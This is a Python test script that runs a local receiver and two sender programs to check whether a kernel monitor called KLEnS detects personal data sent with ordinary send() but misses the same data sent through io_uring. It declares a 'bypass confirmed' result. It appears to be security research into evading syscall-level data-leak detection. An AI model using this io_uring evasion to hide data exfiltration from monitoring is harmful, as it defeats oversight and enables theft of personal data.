import subprocess, time, json, sys, os, signal

RECEIVER_CODE = '''
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(("127.0.0.1",9999));s.listen(1);s.settimeout(40)
try:
    conn,_=s.accept();data=conn.recv(4096)
    open("/tmp/recv_out.txt","w").write(data.decode())
    conn.close()
except Exception as e:
    open("/tmp/recv_out.txt","w").write("ERROR:"+str(e))
s.close()
'''
PII_MARK = "orange.fr"

def run_case(binary, label):
    if os.path.exists("/tmp/recv_out.txt"): os.remove("/tmp/recv_out.txt")
    recv = subprocess.Popen([sys.executable, "-c", RECEIVER_CODE])
    time.sleep(1)
    send = subprocess.Popen([f"./{binary}", "10"], stdout=subprocess.PIPE, text=True)
    time.sleep(1)
    pid = int(send.stdout.readline().strip().split("=")[1].split()[0])
    print(f"[{label}] sender PID={pid}, attaching KLEnS...")
    probe = subprocess.Popen(["sudo", sys.executable, "klens_probe.py", str(pid)],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(4)
    send.wait(timeout=25)
    time.sleep(3)
    try:
        probe.send_signal(signal.SIGINT); time.sleep(1); probe.kill()
    except Exception: pass
    recv.wait(timeout=10)
    got = open("/tmp/recv_out.txt").read() if os.path.exists("/tmp/recv_out.txt") else ""
    print(f"[{label}] receiver got: {got[:70]}")
    detected = False
    if os.path.exists("klens_events.jsonl"):
        for line in open("klens_events.jsonl"):
            if PII_MARK in line:
                detected = True; break
    print(f"[{label}] KLEnS detected PII: {detected}")
    return detected

if os.path.exists("klens_events.jsonl"): os.remove("klens_events.jsonl")
print("="*50); print("CONTROL: regular send() -> expect DETECT"); print("="*50)
r_reg = run_case("regular_sender", "REGULAR")

if os.path.exists("klens_events.jsonl"): os.remove("klens_events.jsonl")
print("="*50); print("TEST: io_uring send -> expect NO DETECT (bypass)"); print("="*50)
r_iou = run_case("iouring_sender", "IO_URING")

print("="*50)
print(f"regular send detected: {r_reg}")
print(f"io_uring send detected: {r_iou}")
if r_reg and not r_iou:
    print(">>> BYPASS CONFIRMED: io_uring evades KLEnS syscall-level probes <<<")
elif r_reg and r_iou:
    print(">>> io_uring ALSO detected: KLEnS hooks deeper than syscall entry <<<")
else:
    print(">>> UNEXPECTED: check probe attachment / receiver <<<")
json.dump({"regular": r_reg, "iouring": r_iou}, open("iouring_bypass_result.json", "w"))
